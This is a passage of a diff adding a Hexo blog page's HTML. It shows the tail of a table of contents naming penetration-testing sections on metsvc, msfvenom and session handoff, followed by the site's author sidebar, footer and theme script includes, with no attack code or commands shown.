class="nav-text">metsvc后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#连接metsvc后门"><span class="nav-number">3.19.2.1.</span> <span class="nav-text">连接metsvc后门</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfvenom"><span class="nav-number">3.19.3.</span> <span class="nav-text">msfvenom</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#连接后门"><span class="nav-number">3.19.3.1.</span> <span class="nav-text">连接后门</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSF取得的会话派生到CS"><span class="nav-number">3.19.4.</span> <span class="nav-text">MSF取得的会话派生到CS</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
